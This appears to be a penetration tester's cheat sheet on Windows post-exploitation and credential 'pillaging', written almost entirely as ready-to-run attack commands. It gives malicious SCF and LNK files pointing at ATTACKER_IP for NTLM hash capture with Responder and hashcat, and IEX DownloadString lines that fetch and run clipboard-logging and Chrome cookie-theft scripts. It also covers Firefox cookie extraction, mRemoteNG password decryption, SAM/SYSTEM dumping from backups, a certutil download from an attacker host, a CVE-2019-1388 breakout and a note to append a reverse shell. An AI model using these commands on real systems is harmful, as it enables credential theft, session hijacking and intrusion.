# âœ… Interacting with Users & Pillaging (Cheat Sheet)

---

## ðŸŽ¯ Quick Wins
- [ ] **Capture Network Traffic** â†’ Wireshark / tcpdump / net-creds
- [ ] **Monitor Command Lines** â†’ Detect creds in scheduled tasks
- [ ] **SCF / LNK Attack on File Shares** â†’ Capture NTLM hashes
- [ ] **Clipboard Logging** â†’ Capture copy-pasted passwords
- [ ] **Cookie Theft** â†’ Firefox/Chrome SQLite DB + SharpChromium
- [ ] **Key Backup Targets** â†’ .vhd, .vhdx, .vmdk for SAM/SYSTEM
- [ ] **Abuse Weak Permissions** â†’ Writeable scripts in C:\Scripts
- [ ] **Living Off The Land Binaries (LOLBAS)** â†’ certutil, rundll32
- [ ] **Backup Abuse** â†’ Extract hashes or config files
- [ ] **Mimikatz / LaZagne** â†’ Credential dump

---
## âœ… Check Netstat

```powershell
# check for interesting services\ports 
netstat -anot
```

---
## âœ… Public Exploits

> they are already in my tools

```c
# Step 1 - Identify the system
systeminfo
# Step 2 - Get hte hostfixID
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

```c
https://github.com/sickn3ss/exploits/tree/master/CVE-2023-29360/x64/Release
https://github.com/sickn3ss/exploits/
```
## âœ… Network Traffic Capture
```powershell
# If Wireshark installed and Npcap not restricted
# Capture cleartext creds (FTP, HTTP)
# On attack machine
tcpdump -i eth0 -w capture.pcap
net-creds -i capture.pcap
```
## âœ… Monitor Process Command Lines
```c
# Detect creds passed via scheduled tasks or scripts
while($true){
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object $process $process2
}
```
> Example finding:
```c
net use T: \\sql02\backups /user:domain\sqlsvc My4dm1nP@s5w0Rd
```
## âœ… SCF / LNK File Attack for NTLM Hashes
```c
# Malicious SCF
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```
> Run Responder:
```c
sudo responder -wrf -v -I tun0
```
> Crack NTLMv2 hash:
```c
hashcat -m 5600 hash.txt rockyou.txt
```
## âœ… Generate Malicious .LNK (PowerShell)
```c
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\ATTACKER_IP\@pwn.png"
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Save()
```
## âœ… Clipboard Logger
```c
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```
> Output example:
```c
https://portal.azure.com
Administrator@domain.com
Sup3rP@ssword123
```
## âœ… Cookie Theft (Firefox)
```c
# Copy SQLite DB
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```
> Extract Slack cookie:
```c
python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d
```
## âœ… Cookie Theft (Chrome)
```c
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
Invoke-SharpChromium -Command "cookies slack.com"
```
## âœ… Pillaging â€“ Interesting Locations

- [ ] Browser Data â†’ Chrome/Firefox profiles
- [ ] Password Managers â†’ KeePass, mRemoteNG (confCons.xml)
- [ ] Config Files â†’ web.config, appsettings.json
- [ ] SSH Keys â†’ id_rsa
- [ ] Backup Files â†’ .vhd, .vhdx, .vmdk
## âœ… mRemoteNG Credential Decryption
```c
# Extract password
python3 mremoteng_decrypt.py -s "<ENCRYPTED_PASSWORD>"
# If master password exists
python3 mremoteng_decrypt.py -s "<ENCRYPTED_PASSWORD>" -p admin
```
## âœ… Mount Virtual Disks & Extract Hashes
```c
# Linux
guestmount -a disk.vmdk -i --ro /mnt/vmdk
guestmount --add backup.vhdx --ro /mnt/vhdx/ -m /dev/sda1

# Dump SAM & SYSTEM
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```
## âœ… LOLBAS: File Download via certutil
```c
certutil.exe -urlcache -split -f http://ATTACKER_IP/file.exe file.exe
```
> Encode/Decode:
```c
certutil.exe -encode input.txt encoded.txt
certutil.exe -decode encoded.txt output.txt
```
## âœ… CVE-2019-1388 Exploit

```c
- Old signed executable â†’ hhupd.exe
- Run as Admin â†’ Open Certificate â†’ Click hyperlink â†’ Browser as SYSTEM
- Breakout: Save As â†’ Type C:\Windows\System32\cmd.exe
```
## âœ… Scheduled Task Enumeration
```c
# IN CMD
schtasks /query /fo LIST /v

# In Powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
## âœ… Abusing Writeable Scripts
```c
accesschk64.exe /accepteula -s -d C:\Scripts\
# Append reverse shell or beacon
```
## âœ… Mount & Extract Backup Systems
```c
- Backup software like restic, Veeam, Windows Backup
- Abuse backup creds (usually local admin on all systems)
- Restore snapshots â†’ Extract SAM & SYSTEM â†’ Dump hashes
```
## âœ… Key Tools

```
- Responder / Inveigh â†’ Capture NTLM hashes
- net-creds â†’ Extract creds from PCAP
- SharpChromium â†’ Cookie theft
- Invoke-Clipboard â†’ Clipboard monitoring
- PowerUp.ps1 / WinPEAS â†’ PrivEsc checks
- secretsdump.py â†’ Extract local hashes
```
